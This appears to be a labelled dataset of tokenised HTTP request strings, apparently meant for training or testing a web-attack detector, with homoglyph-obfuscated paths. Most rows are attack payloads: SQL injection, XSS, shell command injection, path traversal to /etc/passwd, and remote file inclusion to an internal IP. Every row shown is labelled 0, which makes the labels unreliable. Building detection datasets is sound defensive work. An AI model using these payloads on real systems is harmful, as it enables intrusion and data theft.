sentences 	 labels
/ ꜱ𝗍ring / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo ezdzjg )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  #  	 0
/ 𐓒o𝟧qp766 . pl ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝐬𝘵ring / modo = registro & login = schenck6 & password = otorgadera & nombre = balbino & apellidos = zapata + pine & email = falconetti @ normatic-vending . ar & dni = 77359416c & direccion = calle + lope + de + vega + 19 +  & ciudad = valle + de + losa & cpa = 02270 & provincia = valladolid & ntc = 2171024439369893 & b1 = registrar  	 0
/ j𝘢𑣀ascript /  . passwd . tgz  	 0
/ 𝓼𝘁ring / modo = registro & login = willison & passworda = a2ent9dora & nombre = adelen & apellidos = avell & email = slaughter-worde @ juegois . ac & dni = 93046182g & direccion = plza .  + de + la + concepcion ,  + 121 +  & ciudad = figueruelas & cp = 01220 & provincia = burgos & ntc = 6349941758199278 & b1 = registrar  	 0
/ 𐑈𝑡ring / strings / parameters = -5054 %  "  "  )  )  )  union all select 8263 , 8263 , 8263 , 8263 --  	 0
/ k𝓌𝖎noqez . exe /  	 0
/ 𝖘𝗍ring / modo = registro & login = chari & password = 7abu5u9o & nombre = martn & apellidos = dionisio + catalan '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & email = lenauer @ buscamoto . bg & dni = 11787764b & direccion = colonia + san + buenaventura ,  + s / n +  & ciudad = calicasas & cp = 50299 & provincia = zaragoza & ntc = 2683958622320827 & b1 = registrar  	 0
/ 𝘱𝖍pmyadmin /  /  .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c / etc / passwd  	 0
/ 𝔰𝒕ring / strings / parameters = < bgsound src =  " javascript : confirm (  ' xss '  )  ;  "  >  	 0
/ 𝘀𝘵ring / strings / parameters = 1 "  "  )  where 9115 = 9115 ; select case when 8867 = 7630 then 1 else null end --  	 0
/ j𝟜𝗋dyhw8 . jsp ?  < meta http-equiv = set-cookie content =  " testrluj = 1420 "  >  	 0
/ 𝖘𝗍ring / strings / parameters = 1 '  )  )  as bwjl where 8538 = 8538 union all select null , null , null , null , null , null , null #  	 0
/ ѕ𝕥ring / errormsg =  '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  ' %  	 0
/ 𝖍𝔢lp . php ? q =  " ping ; -w ; 8000 ; -n ; 1 ; 4 . 3 . 2 . 1 | rem ;  	 0
/ 𐑈𝓽ring / strings / parameters = -5500 '  )  order by 1 --  	 0
/ 𑣁𝘁ring / modo = insertar & precio = 8083 & b1 = confirmarany set-cookie :  + tamper = 1041264011025374727  	 0
/ 𝔰𝕥ring / strings / parameters = -5292 '  )  union all select 1439 , 1439 , 1439 , 1439 #  	 0
/ ƽ𝔱ring / strings / parameters = '  & echo $ ifspgddip $  (  ( 30 + 43 )  )  $  ( echo $ ifspgddip ) pgddip &  	 0
/ j𝚞j𝗀xwav . cgi ?  < script > document . cookie =  " testknim = 9383 ;  "  <  / script >  	 0
/ j𝒶𝐯ascript /  . passwd . trace  	 0
/ ƽ𝓽ring / modo = insertar & precio = 853 & b1 =  '  + and +  ' 1 '  =  ' 1  	 0
/ 𑣁𝘵ring / strings / parameters = 1 %  '  and 6454 = 8348 and  '  %  '  =  '  	 0
/ еn-𝐮s / oie504mr . nsf ?  < script > document . cookie =  " testtpby = 7052 ;  "  <  / script >  	 0
/ 𝓇𝒂_bust ' em /  	 0
/ 𝓮ᶃaet53a . aspx ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝓎𝒆f5f3d5 . html ?  < script > document . cookie =  " testcrcv = 6167 ;  "  <  / script >  	 0
/ 𝓈𝖙ring / strings / parameters = 1 '  |  |  ( select  ' sxya '  where 3578 = 3578 ; select  ( case when  ( 6276 = 6276 )  then 6276 else 6276 *  ( select 6276 from information_schema . character_sets )  end )  #  	 0
/ 𝖊n-ꞟs / oie504mr . jsp ?  < meta http-equiv = set-cookie content =  " testtpby = 7052 "  >  	 0
/ m𝓪𝒊n . php ? logout =  "  & ping \ xa0-w \ xa07000 \ xa0-n \ xa01 \ xa01 . 2 . 3 . 4 & rem \ xa0  	 0
/ ꬲ𝘅amples / jsp / num / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1369222205 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  	 0
/ 𝗁𝙩bin / query ? mss =  .  .  / config  	 0
/ 𝙨𝚝ring / strings / parameters = < script > 1 \ u0069 \ u006e [  ]  ;  <  / script >  	 0
/ 𝘀𝒄ripts / index . php ? album =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ 𝘷𝈆axg1p8 . asp ?  < script > document . cookie =  " testxagh = 6987 ;  "  <  / script >  	 0
/ 𝐬𝑡ring / strings / parameters = 1 '  ,  ( select  ( case when  ( 1570 = 1570 )  then  ( select 1570 from pg_sleep ( 5 )  )  else 1 /  ( select 0 )  end )  )  	 0
/ 𝘦n-ꭎs / manager / search / data / inputs / script / _new ? action = edit  	 0
/ ꜱ𝔱ring / strings / parameters = |   / bin / sleep 31  ;  	 0
/ 𝚌𝑓ide / scripts / ajax / fckeditor / editor / filemanager / connectors / cfm / cf5_connector . cfm ? command = fileupload & type = file & currentfolder =  /  	 0
/ 𑣁𝐭ring / modo =  |  & precio = 6541 & b1 = confirmar  	 0
/ 𝓼𝙩ring / modo = registro & login = rubenste & passworda = repajo & nombre = exequiel & apellidos = di + giorgi + kohls & email = kagan @ infotek . np & dni = 32194904x & direccion = extrarradio + poligono + industrial + comarca + 1 + 67 ,  + 12f & ciudad = entrambasaguas & cp = 05429 & provincia = vila & ntc = 5141976023395165 & b1 = registrar  	 0
/ 𝕕𝟺4uk9h2 . asp ?  < meta http-equiv = set-cookie content =  " testmybc = 2088 "  >  	 0
/ 𝔰𝗍ring / strings / parameters = "  & echo $ ifspxwawg $  (  ( 93 + 23 )  )  $  ( echo $ ifspxwawg ) pxwawg  	 0
/ j𝑎𝘃ascript / jbossas . exe  	 0
/ 𝘀𝕥ring / strings / parameters = 1 %  '  )  )  )  order by 1 #  	 0
/ 𝔵𝒇kun1ku . dll ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ ᴄƍi-bin / manager / media / browser / mcpuk / connectors / php / commands / thumbnail . php ? base_path =  / etc / passwd \ x00  	 0
/ 𝗲n-𝗎s / i686v90l . cfc ?  < meta http-equiv = set-cookie content =  " testfutf = 1550 "  >  	 0
/ 𑣁𝕥ring / strings / parameters = echo xoeucm $  (  ( 23 + 30 )  )  $  ( echo xoeucm ) xoeucm |  	 0
/ ѕ𝗍ring / strings / parameters = < div id =  " 43 "  >  <  ? xml version =  " 1 . 0 "  standalone =  " no "  ?  >  	 0
/ 𝘀𝐭ring / modo = registro & login = vanderbi & password = brechar & nombre = rudolph & apellidos = simo + baixaul & email = guarneros @ elfisioencasa . euany ?  set-cookie :  + tamper = 5765205567234876235 & dni = 07929654j & direccion = d '  + irlanda ,  + 150 ,  + 4g & ciudad = crulles ,  + monells + i + sant + sadurn + de + l ' heura & cp = 22362 & provincia = palencia & ntc = 7146200335863301 & b1 = registrar  	 0
/ 𝗌𝗍ring / modo = insertar & precio = 2602 & b1 = confirmar /  	 0
/ moo𝒅lⅇ / filter / tex / texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + db + 68 + 74 + 49 + 6e + 66 + 68 + 4e + 74 + 53 + 65 + 54 + 50 + ff + 54 + 24 + 38 + 50 + 8d + 4c + 24 + 30 + 6a + 04 + 51 + 6a +  +  >  > ctdn  	 0
/ ߀𝓇ufe52p . asp ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝔯𝑒cordings / apexec . pl ? etype = odp & template =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html & passurl =  / category /  	 0
/ 𝕤𝘵ring / strings / parameters = < img src =  " a "  onerror =  ' eval ( atob (  " chjvbxb0kdepow =  =  "  )  )  '  >  	 0
/ 𝐬𝓉ring / strings / parameters = 1 '  and 5556 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  and  ' tqvy '  like  ' tqvy  	 0
/ 𐑈𝘵ring / strings / parameters = 1 '  )  ; select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 and  (  ' atyf '  =  ' atyf  	 0
/ ƽ𝗍ring / strings / parameters = "   str =  $  ( echo oujvkx )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  	 0
/ 𝘂𝒸3w3bdi . php3 ?  < meta http-equiv = set-cookie content =  " testxllt = 9940 "  >  	 0
/ 𝕤𝙩ring / strings / parameters = echo fhnibr $  (  ( 51 + 94 )  )  $  ( echo fhnibr ) fhnibr  	 0
/ 𝟳o𝟻qp766 . x ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝖻oo𝙧p ' s /  	 0
/ 𝓈𝘵ring / strings / parameters = < a href =  " javascript \ x0d : javascript : alert ( 1 )  "  id =  " fuzzelement1 "  > test <  / a >  	 0
/ 𝘀𝖙ring / strings / parameters = 1 '  )  where 9951 = 9951  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  else char ( 76 )  |  | char ( 65 )  |  | char ( 102 )  |  | char ( 72 )  end )  from  ( values ( 0 )  )  )  --  	 0
/ ѕ𝚝ring / strings / parameters = '  ;  str =  $  ( echo zgyobq )  ;  str1 =  $  {  # str }  ;  if  [  6 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  	 0
/ 𝖈αcti / workarea / contentdesigner / ekformsiframe . aspx ? id =  "  >  < script > alert (  ' nessus '  )  <  / script >  	 0
/ е𝖝amples / jsp / checkbox / help / index . php ? help_file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𝘀𝑡ring / strings / parameters = |   [  8 -ne  $  ( echo qjdbjn  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  	 0
/ һ𝚎lp . php ? q =  " ping -w 10000 -n 1 4 . 3 . 2 . 1 | rem  	 0
/ j𝖺𑜆ascript / info . exe  	 0
/ ɩ𝈒prbs22 . dll ?  < script > document . cookie =  " testjnre = 7328 ;  "  <  / script >  	 0
/ 𝒸𝚊000007 . pl ? action = showcart & refpage =  \  "  >  < script > alert (  ' vulnerable '  )  <  / script >  	 0
/ 𝑠𝑡ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo jwnhuw )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  &  	 0
/  .  \  \  .  .  \  \  { file }  	 0
/ 𝘴𝓽ring / modo = registro & login = hyatt & password = 8c75ps8s & nombre = raimundo & apellidos = trave + girard 	 0
/ j𝒂טascript / cgi-shl . exe  	 0
/ 𝘀ϲripts / index . php ? req_path = http :  /  / xxxxxx .  /  	 0
/ j𝘥𝑥255ea . cfc ?  < meta http-equiv = set-cookie content =  " testziyq = 5055 "  >  	 0
/ 𑣁𝑡ring / strings / parameters = >  < script > confirm ( string . fromcharcode ( 88 , 83 , 83 )  )  ;  <  / script >  	 0
/ 𝟘𝙬155a7c . exe ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝐩ꭇeview . php ? php_script_path = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ?  ?  & cmd = dir  	 0
/ jꭎj𝔤xwav . x ?  < meta http-equiv = set-cookie content =  " testknim = 9383 "  >  	 0
/ j𝐚𝐯ascript / caller . exe  	 0
/ 𝑠𝓽ring / strings / parameters = 1 "  "  )  as rnjx where 2679 = 2679 and 2388 = benchmark ( 5000000 , md5 ( 0x6d457153 )  )  #  	 0
/ Ʒ𝗁lysl2x . exe ?  < script > document . cookie =  " testgjbe = 8505 ;  "  <  / script >  	 0
/ j𝑎ѵascript / dms0 . exe  	 0
/ 𝔥𝙚lp . php ? q =  "  & del q92537281 & rem  	 0
/ 𝖘𝓽ring / strings / parameters = "  |  | echo grzssh $  (  ( 83 + 88 )  )  $  ( echo grzssh ) grzssh &  	 0
/ 𝟔n𝟳aacgg . fts ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ ꜱ𝓉ring / strings / parameters = >  	 0
/ 𝕒୦imiuf1 . do ?  < meta http-equiv = set-cookie content =  " testxqrn = 4654 "  >  	 0
/ 𝙦һvu0pdg . aspx ?  < meta http-equiv = set-cookie content =  " testchuc = 2100 "  >  	 0
/ 𝕧𝗵zmaia2 . nsf ?  < meta http-equiv = set-cookie content =  " testkogj = 3979 "  >  	 0
/ ƽ𝓽ring / modo = insertar & precio = 5949 & b1 = confirmar /  	 0
/ 𝗌𝐭ring / strings / parameters = -1272 '  or 1 group by concat ( 0x7171706a71 ,  ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  )  having min ( 0 )  #  	 0
/ 𐑈𝖙ring / strings / parameters = '  |  | echo wqkjhl $  (  ( 97 + 29 )  )  $  ( echo wqkjhl ) wqkjhl \  \  	 0
/ 𝑠𝕥ring / strings / parameters = 1 )  where 9206 = 9206 union all select null , null , null , null , null , null #  	 0
/ ꜱ𝘵ring / strings / parameters = ;  str =  $  ( echo zvpmjq )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  	 0
/ z𝘲𝑞emp6j . dll ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝖽ℯ3v2dd9 . cfc ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝕤𝔱ring / strings / parameters = "  )  ,  ( select if ( count (  *  )  !  = -1 , benchmark ( 3000000 , md5 ( 1 )  )  , benchmark ( 3000000 , md5 ( 1 )  )  )  )  #  	 0
/ 𝘅oo𝐩s232b / htdocs / xoops_lib / modules / protector / onupdate . php ? mydirname = a (  )  {  } system (  '  /  .  / tmp / zoywsxjghe . sh +  >  +  / dev / null +  &  '  )  ;  function v  	 0
/ 𝒔𝔠ripts /  .  .  \ xe0 \ x80 \ xaf .  .  \ xe0 \ x80 \ xaf .  .  \ xe0 \ x80 \ xaf .  .  \ xe0 \ x80 \ xaf .  .  \ xe0 \ x80 \ xaf .  .  / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og  	 0
/ 𝓹𝖆th_script / createurl . php ? formurl = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ?  	 0
/ сonꞙirmunsubscription . php ? output = http :  /  / 192 . 168 . 202 . 96 : 8080 / txenjrxf3 ?  	 0
/ 𑣁𝘁ring / modo = registro & login = xi-xian9 & password = p ? erspicacidad & nombre = geraldo & apellidos = pedrol & email = chalon @ ingenelec . gl & dni = 10207822p & direccion = c /  + paloma ,  + 197 +  & ciudad = laguna + dalga & cp = 47520 & provincia = pontevedra & ntc = 331994682613323 & b1 = registrar  	 0
/ 𑣁𝔱ring / modo = entrar & login = raymund & pwd =  , c ' oraje & remember = on & b1 = entrar  	 0
/ 𝑠𝐭ring / strings / parameters = 1 '  )  )  )  and  ( select 9067 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9067 = 9067 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  and  (  (  (  ' wzdo '  =  ' wzdo  	 0
/  < meta http-equiv = set-cookie content =  " testkwlg = 5591 "  >  	 0
/ 𝐞n-𝐮s / s7qus4g3 . cfm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝐬𝘵ring / str =  $  ( echo ljkrdd )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  '  	 0
/ 𝖕𝓱pmyadmin /  /  .  . 0x5c .  . 0x5c .  . 0x5c .  . 0x5c .  . 0x5c .  . 0x5c .  . 0x5c .  . 0x5cetc / passwd  	 0
/ ℯ𝒙amples / servlets / servlet / insertorder . cfm ? cfid = 1 & cftoken = 1 union select 1 , 2 , 3 , 4 , storename , 6 , 7 , 8 , 9 , 10 , 11 , 12 , 13 , 14 , 15 from params " having 1 = 1  	 0
/ 𝔰𝐭ring / strings / parameters = -2323 "  "  )  as zgsn where 9274 = 9274 or 3440 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  --  	 0
/ ⅇ𝖝amples / jsp / checkbox / index2 . php ? _server [  ]  =  & _server [ remote_addr ]  =  '  . system (  ' id '  )  . exit (  )  .  '  & option = wrapper & module [ module ]  = 1  	 0
/ 𝔟𝟏q8bywu . idc ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ n𝟙𝖆fe1y6 . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝐢𝟮n4v4rl . htm ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝚜𝙩ring / modo = registro & login = michaud & password = cit73e ,  /  ' o & nombre = enoch & apellidos = demuner & email = stevensen7 @ deltamarina . cat & dni = 50873406m & direccion = emigrante + 50 ,  +  & ciudad = monroyo & cp = 30191 & provincia = guadalajara & ntc = 8474012494914092 & b1 = registrar  	 0
/ 𝑠𝓉ring / strings / parameters = 1 )  )  as huxq where 7451 = 7451 union all select null , null , null --  	 0
/ ꜱ𝖙ring / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo zdemvi )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  /  /  	 0
/ 𝖘𝓽ring / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo fkfulk )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  "  	 0
/ ҽ𝑥amples / jsp / jsp2 / jspx / apps / pbcs . dll / misc ? url =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini  	 0
/  ⁒ uff0e % uff0e % u2216 % uff0e % uff0e % u2216 % uff0e % uff0e % u2216 % uff0e % uff0e % u2216 % uff0e % uff0e % u2216 % uff0e % uff0e % u2216 { file }  	 0
/ 𝘴𝒕ring / modo = insertar & precio = 4250 	 0
/ 𝒔𝕥ring / strings / parameters = -6475 "  "  )  )  )  or 4144 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual )  and  (  (  (  "  " mdsx "  "  like  "  " mdsx  	 0
/ 𝕙𝔢lp . php ? q = ping ; -w ; 11000 ; -n ; 1 ; 4 . 3 . 2 . 1 & rem ;  	 0
/ 𝘴𝐭ring / strings / parameters = -1823 where 6852 = 6852 union all select 6852 , 6852 , 6852 , 6852 , 6852 , 6852 #  	 0
/ 𝘴𝘁ring / modo = registro & login = nady & password = 9va3831 & nombre = shirley & apellidos = urbaez + mariangel & email = erlich-jarrel @ modeloscaninos . ni & dni = 39759775c & direccion = algarrobo + 197 + 3 ? f & ciudad = navalonguilla & cp = 0379a & provincia = segovia & ntc = 5083698855321760 & b1 = registrar  	 0
/ ୦𝙪75ldxq . fts ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝒉𝖊lp . php ? q =  " rm q98145633 & rem  	 0
/ mɑın . php ? stuff =  '  \ x0dsleep \ x097 \ x09 #  	 0
/ ѕ𝕥ring / strings / parameters = 1 '  +  ( select  ' rejz '  where 1530 = 1530 and 7756 = dbms_utility . sqlid_to_sqlhash (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  )  +  '  	 0
/ 𝚜𝗍ring / strings / parameters = window [  " alert "  ]  ( 1 )  	 0
/ 𝙚𝚡amples / servlets / servlet / webcart . cgi ? config = mountain & change = yes & nextpage =  ; id |  & code = phold  	 0
/ 𝟳𝒹bjwpw6 . idc ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ ꜱ𝐭ring / strings / parameters = 1 '  ; begin user_lock . sleep ( 5 )  ;  end --  	 0
/ 𑣆𝒖1pb2xi . php ?  < meta http-equiv = set-cookie content =  " testlwwz = 718 "  >  	 0
/ ᴄ𝘨i-bin / search . cgi ?  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ windows \ win . ini  	 0
/ 𝒔𝓉ring / modo = insertar & precio = 6027 & b1 = confirmar < script > alert (  " paros "  )  ;  <  / script >  	 0
/  ʺ yahya zaini "  /  	 0
/ 𝐡𝖾lp . php ? q =  " rm \ x0cq65994111 & rem \ x0c  	 0
/ n𝚢𝐯bv05h . kspx ?  < meta http-equiv = set-cookie content =  " testftxz = 5980 "  >  	 0
/ 𝔰𝓽ring / strings / parameters = "  |   [  4 -ne  $  ( echo nreisi  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  	 0
/ 𑣁𝓉ring / strings / parameters = 1 %  "  "  or updatexml ( 1808 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 1808 = 1808 , 1 )  )  )  , 0x717a767a71 )  , 8666 )  and  "  "  %  "  "  =  "  "  	 0
/  ; s = 7 ; c = 1013 ; a = 1 ; l = 1 ; p = 20 ; sc = 5661 ; n = 0 ; b = 16433 /  	 0
/ ꜱ𝖙ring / strings / parameters = 1 '  and updatexml ( 3393 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 3393 = 3393 , 1 )  )  )  , 0x717a767a71 )  , 1161 )  and  ' kird '  =  ' kird  	 0
/ 𝕤𝚌ripts / type . asp ? itype =  ' duware_itype_sql_injection . nasl  	 0
/ 𝘴𝓉ring / strings / parameters = 1 "  "  where 7828 = 7828 ; select  ( case when  ( 4769 = 4769 )  then 4769 else 4769 *  ( select 4769 from mysql . db )  end )  #  	 0
/ 𝓈𝑡ring / strings / parameters = 1 )  )  )  or char ( 119 )  |  | char ( 100 )  |  | char ( 99 )  |  | char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 )  , 0 )  , 5000000000 )  , null )  --  	 0
/ 𝕒𝐚aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa .  .  .  .  .  .  .  .  .  .  { file }  	 0
/ 𝐬𝓉ring / strings / parameters = < html onmousemove html onmousemove =  " javascript : javascript : alert ( 1 )  "  >  <  / html onmousemove >  	 0
/ l𝟺ꬵz1dqw . cgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
